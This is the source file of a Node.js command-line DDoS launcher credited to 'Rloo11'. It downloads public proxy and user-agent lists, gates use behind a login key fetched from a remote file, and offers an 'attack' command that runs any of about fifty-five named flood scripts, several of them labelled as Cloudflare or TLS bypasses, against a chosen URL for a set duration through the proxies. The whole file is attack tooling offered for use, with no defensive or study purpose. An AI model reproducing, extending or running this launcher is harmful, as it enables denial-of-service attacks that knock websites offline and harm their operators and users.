#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '8.1.6'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
РађРађРађРађРађРађРбђРБцРБХРБХРБќРБдРБёРАђРађРађРађРађРађРађРађРађ
РађРађРађРађРбђРБЙРАЪРБЅРБйРБ┐Рб┐РА┐РБ┐РБ┐РБєРађРађРађРађРађРађРађ
РађРађРађРбаРБ┐РБ┐РБ┐РАЌРаІРаЎРА┐РБиРбїРБ┐РБ┐РађРађРађРађРађРађРађ­ЮЋй­ЮќЉ­Юќћ­Юќћ ­ЮќЅ­ЮќЅ­Юќћ­Юќў­ЪЋі№ИЈ­Ъфй ­ЮЉф2 ­ЮЉЙ­ЮЉг­ЮЉЕ­ЮЉ║­ЮЉ░­ЮЉ╗­ЮЉг ${version}
РБиРБёРБђРБ┐РБ┐РБ┐РБ┐РБиРБдРБцРБЙРБ┐РБ┐РБ┐РА┐РађРађРађРађРађРађРађ­ЮЎЙ­Юџа­ЮџЌ­Юџј­ЮџЏ: ­ЮЋй­ЮќЉ­Юќћ­Юќћ11Рђб­Юљњ­ЮљЊ­Юљј­ЮљЉ­Юљё­ЪЋі№ИЈ­Ъфй
РаѕРаЎРаЏРБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБДРАђРађРбђРађРађРађРађ­ЮЎ┐­ЮџЏ­Юџј­Юџќ­Юџњ­Юџъ­Юџќ: ­Юџѕ­Юџј­Юџю
РађРађРађРаИРБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РАЪРа╗Ра┐Ра┐РаІРађРађ.  ­ЮџЃ­Юџј­ЮџЋ­Юџј­Юџљ­ЮџЏ­Юџі­Юџќ: @Rloo11
РађРађРађРађРа╣РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РАЄРађРађРађРађРађРађРађРађ­ЮЎ╝­Юџб ­ЮџЃ­Юџј­Юџі­Юџќ: @CTR INDONESIA
РађРађРађРађРађРаѕРб┐РБ┐РБ┐РБ┐РБ┐РБ┐РБ┐РБЄРађРађРађРађРађРађРађРАё
РађРађРађРађРађРађРађРаЎРб┐РБ┐РБ┐РБ┐РБ┐РБ┐РБєРађРађРађРађРбђРАЙРађ
РађРађРађРађРађРађРађРађРађРаѕРа╗РБ┐РБ┐РБ┐РБ┐РБиРБХРБ┤РБЙРаЈРађРађ
РађРађРађРађРађРађРађРађРађРађРађРађРаѕРаЅРаЏРаЏРаЏРаІРаЂРађРађРађРађ
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| РќЊРќЉРќЉРќЉРќЉРќЉРќЉРќЉРќЉРќЉ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| РќЊРќЊРќЉРќЉРќЉРќЉРќЉРќЉРќЉРќЉ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Xlamper/PermenMdXlamper-Version-8.1.6-/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| РќЊРќЊРќЊРќЉРќЉРќЉРќЉРќЉРќЉРќЉ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| РќЊРќЊРќЊРќЊРќЊРќЊРќЉРќЉРќЉРќЉ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Rloo1197/R3X/refs/heads/main/ngeri.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31m­ЮЋй­Юќћ­Юќћ­ЪЋі№ИЈ­Ъфй ­ЮЋЙ­Юќі­Юќѕ­Юќџ­ЮќЌ­Юќј­ЮќЎ­Юќъ\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| РќЊРќЊРќЊРќЊРќЊРќЊРќЊРќЉРќЉРќЉ || 70%`)
        await scrapeUserAgent()
        console.log(`|| РќЊРќЊРќЊРќЊРќЊРќЊРќЊРќЊРќЊРќЊ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`­Юџє­Юџј­ЮџЋ­Юџї­Юџў­Юџќ­Юџј ­ЮџЃ­Юџў ­ЮЋй­Юќћ­Юќћ­ЪњИ­ЪцА­Ъфй ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`­ЮЎ║­Юџј­ЮџЮ­Юџњ­Юџћ "­ЮЎ╝­Юџј­ЮџЌ­Юџъ" ­ЮЎх­Юџў­ЮџЏ ­Юџѓ­ЮџЉ­Юџў­Юџа ­ЮЎ░­ЮџЋ­ЮџЋ ­ЮЎ▓­Юџў­Юџќ­Юџќ­Юџі­ЮџЌ­ЮџЇ`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\n­ЮЎ╝­Юџў­ЮџЌ­Юџњ­ЮџЮ­Юџў­ЮџЏ ­ЮЎ░­ЮџЮ­ЮџЮ­Юџі­Юџї­Юџћ:\n");
  processList.forEach((process) => {
console.log(`­ЮџЃ­Юџі­ЮџЏ­Юџљ­Юџј­ЮџЮ: ${process.target}
­ЮЎ╝­Юџј­ЮџЮ­ЮџЉ­Юџў­ЮџЇ­Юџю: ${process.methods}
­ЮЎ│­Юџъ­ЮџЏ­Юџі­ЮџЮ­Юџњ­Юџў­ЮџЌ­Юџю: ${process.duration} ­Юџѓ­Юџј­Юџї­Юџў­ЮџЌ­ЮџЇ­Юџю
­Юџѓ­Юџњ­ЮџЌ­Юџї­Юџј­Юџю: ${Math.floor((Date.now() - process.startTime) / 1000)} ­Юџю­Юџј­Юџї­Юџў­ЮџЌ­ЮџЇ­Юџю ­Юџі­Юџљ­Юџў\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url/ip> <duration> <methods>
attack https://xnxx.com 500 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
РађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРаѕРађРађРБђРађРађРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРАђРађРађРађРађРађРађРађРађРађРађРађРа│РаЃРађРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРБђРА┤РбДРБђРађРађРБђРБаРацРацРацРацРБё.
РађРађРађРађРађРађРађРаўРаЈРбђРА┤РаіРаЂРађРађРађРађРађРађРаѕРаЎРадРАђРађРађРађРађРађРађРађРађРађ
РађРађРађРађРађРађРађРађРБ░РаІРађРађРађРађРађРађРађРађРађРађРађРађРаўРбХРБХРБњРБХРадРБцРБђРађРађ
РађРађРађРађРађРађРбђРБ░РаЃРађРађРађРађРађРађРађРађРађРађРађРађРађРађРаѕРБЪРа▓РАїРаЎРбдРаѕРбДРађ
РађРађРађРБаРб┤РАЙРбЪРБ┐РађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРБИРА┤РбЃРАаРаІРБаРаІРађ
РаљРађРаъРБ▒РаІРб░РаЂРб┐РађРађРађРађРађРађРађРађРађРађРађРБђРБаРацРбќРБІ.РбќРБФРаћРаІРађРађРађ
РаѕРааРАђРа╣РбцРБѕРБЎРаџРаХРацРацРацРа┤РаХРБњРБњРБџРБЕРаГРбхРБњРБ╗РаГРбќРаЈРаЂРбђРБђРађРађРађРађ
РааРађРаѕРаЊРањРадРаГРаГРаГРБГРаГРаГРаГРаГРа┐РаЊРањРаЏРаЅРаЅРађРађРБаРаЈРађРађРаўРаъРађРађРађРађ
РађРађРађРађРађРађРађРађРађРаѕРаЊРбцРБђРађРађРађРађРађРађРБђРАцРаъРаЂРађРБ░РБєРађРађРађРађРађРађ
РађРађРађРађРађРаўРа┐РађРађРађРађРађРаѕРаЅРаЎРањРањРаЏРаЅРаЂРађРађРађРаЅРб│РАъРаЅРађРађРађРађРаЂ
РађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађРађ
[===============р┤ђр┤Џр┤Џр┤ђр┤ёр┤І р┤Ар┤Є╩ЎЖю▒╔фр┤Џр┤Є ╩Ў╩Ј ╩ђр┤Јр┤Ј11­Ъўѕ­Ъфй===============]
­ЮџЃ­Юџі­ЮџЏ­Юџљ­Юџј­ЮџЮ   : ${target}
­ЮЎ│­Юџъ­ЮџЏ­Юџі­ЮџЮ­Юџњ­Юџў­ЮџЌ  : ${duration}
­ЮЎ╝­Юџј­ЮџЮ­ЮџЉ­Юџў­ЮџЇ­Юџю  : ${methods}
­ЮЎ░­Юџѓ       : ${result.as}
­ЮЎИ­ЮЎ┐       : ${result.query}
­ЮЎИ­Юџѓ­ЮЎ┐      : ${result.isp}
­ЮЎ╝­Юџѕ ­ЮџЃ­ЮЎ┤­ЮЎ░­ЮЎ╝ : @CTR INDONESIA
­ЮЎЙ­Юџє­ЮЎй­ЮЎ┤­ЮџЂ ­ЮџЃ­ЮЎЙ­ЮЎЙ­ЮЎ╗­Юџѓ : @Rloo11
­Юџѕ­ЮЎЙ­Юџё­ЮџЃ­Юџё­ЮЎ▒­ЮЎ┤ : https://youtube.com/@Rloo11

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt flood`)
	sigma()
  } else if (methods === 'roo-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'roo-traffic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} GET 20`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 800 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'Rloo11') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 800`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 40`)
	sigma()
  } else if (methods === 'mixmax') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 20 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'ctr') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
	} else if (methods === 'pidoras') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60 10 proxy.txt 100`)
	sigma()
  } else if (methods === '404') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'aqua') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'astral') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'barave') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bomba') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bot') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'brow-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'browserddos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-saturn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-test') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'cfa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'cfbypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60`)
	sigma()
	} else if (methods === 'dev') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'dos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'downrapid') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'dragonc2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'esic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'flood-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushMonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 800`)
    sigma()
    } else if (methods === 'strike') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 50 800 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 800 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'starxtls') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
­Юљѓ­ЮљЉ­Юљё­Юљђ­ЮљЊ­Юљё­ЮљЃ ­ЮљЂ­Юљў R11­ЪЋі№ИЈ­Ъфй

­ЮџЃ­ЮџЉ­Юџі­ЮџЌ­Юџћ­Юџю ­ЮџЃ­Юџў:
­Юљє­Юљј­ЮљЃ
­ЮљЉ­Юље­Юље­ЮЪЈ­ЮЪЈ
­ЮљЈ­ЮљФ­Юљб­Юљ▓­Юљ▒­ЮљЦ
­Юљѕ­ЮљФ­ЮљЕ­Юљџ­ЮљД
­Юљј­Юљю­ЮљГ­Юље ­Юљг­Юљб ­ЮљЕ­Юљд­Юље
­ЮљЉ­Юљъ­ЮљБ­Юљџ ­Юљџ­ЮљД­ЮљБ­Юљџ­Юљ▓
­ЮљЁ­Юљџ­Юљб­ЮљГ­ЮљА 
­Юљѓ­Юљџ­ЮљЦ­Юљд
­Юљѓ­ЮљЊ­ЮљЉ
`
permen.question('[\x1b[1m\x1b[32m­ЮЋй­Юќћ­Юќћ11­ЪЋі№ИЈ­Ъфй\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[====================METHODS DDoS====================]
|| 404     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| aqua     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| astral     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| barave     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| bomba     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| bot     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| brow-x     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| browserddos     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| bypass-saturn     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| bypass-test     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| bypass-x     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| cfa     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| cfbypass     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| dev     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| dos     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| downrapid     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| dragonc2     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| esic     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| flood      || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| flood-bypass     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| tls        || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| strike     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| kill       || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| raw        || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| bypass     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| thunder    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| storm      || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| rape       || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| destroy    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| slim       || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| skynet-tls || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| glory      || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| mixsyn     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| mix        || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| pidoras     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| ctr        || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| geckold    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| lezkill    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| tls-vip    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| tls-bypass || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| killer     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| mixmax      || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| xlamper    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| Rloo11        || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй (New Methods)
|| inferno    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| xlamper-bom|| DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| tornado    || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| tlsv1      || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| medusa     || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| uam        || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй
|| Rloo11-traffic|| DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй (New Methods)
|| Rloo11-flood  || DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй (New Methods)
|| night-flood|| DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй (Owner Only)
|| night-bypas|| DDoS WEBSITE BY Rloo11­ЪЋі­Ъфй (Owner Only)
[====================METHODS DDoS====================]
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
